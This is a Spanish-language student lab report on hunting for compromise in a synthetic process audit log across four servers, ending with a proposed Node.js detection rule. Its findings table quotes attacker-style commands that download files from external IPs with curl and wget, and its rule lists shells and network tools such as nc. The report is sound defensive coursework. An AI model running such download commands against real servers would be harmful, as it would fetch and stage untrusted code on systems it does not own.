# Detección y caza — Grupo 07

**Integrantes:** Tomás Terruli, Martina Castellani, Pilar Giannelli · **Fecha:** 08/11/2026

Analizamos `laboratorio/logs/audit.log` (21 eventos del 27/10/2026, entre 09:40 y 09:49 UTC). La salida de los filtros que usamos está en `capturas/16-deteccion-procesos.txt`.

---

## 1. Hipótesis de caza

Si alguno de los servicios fue explotado, deberíamos ver al proceso del servicio (`apache2` en web01, `node` en api01 o `python` en svc01) lanzando una shell o una herramienta de descarga (`sh`, `bash`, `curl`, `wget`, `nc`) dentro de la ventana de 09:40 a 09:49. Esperamos encontrar primero comandos de reconocimiento, como `id` o `uname`, y después alguna descarga desde una IP externa.

La idea es que en funcionamiento normal cada servicio solo lanza procesos propios (`apache2` lanza `apache2`, `node` lanza `node`). Si aparece una shell como hija del servidor web, alguien está ejecutando comandos a través de él.

---

## 2. Hallazgos en `audit.log`

Primero aplicamos el mismo filtro que usa `scripts/detectar.sh`: padre `apache2`, `node` o `python`, e hijo `sh`, `bash`, `curl`, `wget` o `nc`. Nos devolvió las líneas 6, 9, 14 y 16. Después buscamos qué procesos lanzaron esos hijos (por `ppid`) y aparecieron las líneas 7, 10 y 17, que el filtro original no muestra.

| Línea / timestamp | Host | Padre → hijo | ¿Anómalo? | Por qué |
|---|---|---|---|---|
| L6 · 09:42:17 | web01 | apache2 → `sh -c id` | Sí | El servidor web abre una shell y ejecuta `id`, que sirve para saber con qué usuario se está corriendo. |
| L7 · 09:42:18 | web01 | sh → `id` | Sí | Confirma que el comando de L6 se ejecutó. |
| L9 · 09:43:03 | api01 | node → `sh -c curl http://198.51.100.7/x` | Sí | La API no tiene por qué ejecutar `curl`. Es una descarga desde una IP externa. |
| L10 · 09:43:04 | api01 | sh → `curl http://198.51.100.7/x` | Sí | Confirma que la descarga se lanzó. |
| L14 · 09:44:22 | web01 | apache2 → `wget http://198.51.100.9/a` | Sí | Otra descarga desde el servidor web, desde una IP del mismo rango que la de L9. |
| L16 · 09:45:10 | svc01 | python → `sh -c uname -a` | Sí | Reconocimiento del sistema y del kernel en el servicio interno. |
| L17 · 09:45:11 | svc01 | sh → `uname -a` | Sí | Confirma que el comando de L16 se ejecutó. |
| L8, L13, L21 | db01 | sshd → `bash` | Indeterminado | Son sesiones SSH. Pueden ser de un administrador, pero pasan justo durante la actividad sospechosa (ver punto 3). |
| L15, L19 | api01 | node → `node server.js` | No, a revisar | Parecen reinicios normales del servicio, pero ocurren después de L9 (ver punto 3). |

En resumen, en menos de 3 minutos hay actividad rara en tres servidores distintos: reconocimiento en web01 (09:42), descarga en api01 (09:43), descarga en web01 (09:44) y reconocimiento en svc01 (09:45). Las dos IPs de descarga son del mismo rango, 198.51.100.0/24.

**¿Hay compromiso?**

Sí en web01 y api01. En los dos casos el proceso del servicio ejecutó comandos del sistema y lanzó descargas, que es lo esperable si se explotó PHP2Shell (PHP 8.3.35, anterior a 8.3.36) y Node2Shell (Node 22.23.3, anterior a 22.23.4).

En svc01 también hay ejecución de comandos (L16-L17), pero como es un servicio interno no sabemos cómo llegaron: puede ser por contenido que le reenvió otro servicio o desde web01 o api01 ya comprometidos. Con este log no lo podemos saber.

En db01 no encontramos nada anómalo, pero tampoco podemos descartarlo: lo dejamos como indeterminado.

Lo que el log no muestra es si las descargas terminaron bien, si se ejecutó lo descargado o si hubo escalada a root. Eso no quiere decir que no haya pasado, sino que el log no lo registra.

---

## 3. Falsos positivos

Lo que más se parece a un ataque sin serlo necesariamente son las sesiones `sshd → bash` en db01 (L8, L13 y L21). Abrir una shell en el servidor de base de datos en medio de un incidente parece sospechoso, pero `sshd` es justamente el camino normal por el que entra un administrador, y es lógico que alguien esté conectado revisando.

Para saber cuál de los dos casos es, necesitaríamos datos que este log no tiene: el usuario y la IP de origen de cada sesión (desde el `auth.log` de db01), saber quién estaba de guardia ese día y qué comandos se ejecutaron en esas sesiones. Si el origen fuera web01, api01 o svc01, ya no sería un acceso administrativo.

También nos llamaron la atención los reinicios de `node` en api01 (L15 y L19). Parecen normales, pero un intento fallido de Node2Shell puede hacer caer el proceso, y el reinicio sería el sistema volviéndolo a levantar. Para distinguirlo habría que mirar por qué terminó el proceso anterior y cuántas veces se reinició el contenedor (`docker inspect`).

---

## 4. Regla propuesta para Node.js

La regla observa la creación de procesos y alerta cuando el padre es `node` y el hijo es una shell o una herramienta de red:

```text
ppid_comm = "node"  Y  comm en (sh, bash, dash, curl, wget, nc, python, perl)
```

La probamos sobre el log con este comando, y detecta la línea 9:

```powershell
Select-String -Path laboratorio\logs\audit.log -Pattern 'ppid_comm=node ' | Where-Object { $_.Line -match ' comm=(sh|bash|dash|curl|wget|nc|python|perl) ' }
```

Una mejora que proponemos es seguir también a los procesos que lanza ese hijo. El filtro de `detectar.sh` solo mira al hijo directo, así que no muestra las líneas 7, 10 y 17, que son las que dicen qué se ejecutó realmente. Por ejemplo, L9 solo dice `sh`, pero L10 muestra el `curl`. En `capturas/16-deteccion-procesos.txt` está esa segunda búsqueda.

**Falsos positivos:** algunas aplicaciones Node lanzan comandos de forma legítima (para procesar imágenes, usar `git` o correr scripts de `npm`). Habría que armar una lista de comandos permitidos para cada servicio.

**Falsos negativos:**
- Si el atacante descarga algo usando `fetch()` desde el mismo proceso `node`, no se crea ningún proceso hijo y la regla no lo ve.
- Si usa un binario que no está en la lista o lo renombra (por ejemplo, una copia de `curl` guardada como `/tmp/x`), tampoco.
- Si hay un proceso intermedio (`node → npm → sh`), el padre directo ya no es `node`.
- Si el exploit falla y el proceso se cae, no hay hijo para detectar.

La regla solo la probamos sobre este log de laboratorio, no sobre datos reales.

---

## 5. Limitaciones del log

- **No tiene usuario.** No sabemos si los comandos corrieron como un usuario sin privilegios o como root, así que no podemos descartar una escalada.
- **No tiene IP de origen ni el request HTTP.** No podemos saber qué petición provocó cada comando ni de dónde vino el ataque. Habría que cruzar por horario con los logs del servidor web o del proxy.
- **No muestra resultados.** No hay código de salida ni tamaño de lo descargado, así que no sabemos si `curl` y `wget` funcionaron.
- **No registra conexiones de red ni archivos.** No vemos si hubo contacto real con 198.51.100.7 y .9, ni dónde se guardó lo descargado.
- **Cubre solo 9 minutos.** No vemos qué pasó antes ni después (intentos previos, persistencia).
- **Solo muestra el padre inmediato.** Si hay procesos intermedios, se pierde la relación con el servicio.
- **Tiene ruido.** Los procesos normales de `apache2` y `node` se repiten seguido y tapan los eventos importantes si no se filtra.
- **No está protegido.** Un atacante con root podría borrarlo o modificarlo.
- **Es un registro sintético** armado para el laboratorio, así que las conclusiones valen para el ejercicio y no para un servidor real.

Para confirmar o descartar el compromiso haría falta cruzarlo con los logs del servidor web, de Node, el `auth.log` de db01 y los registros del firewall.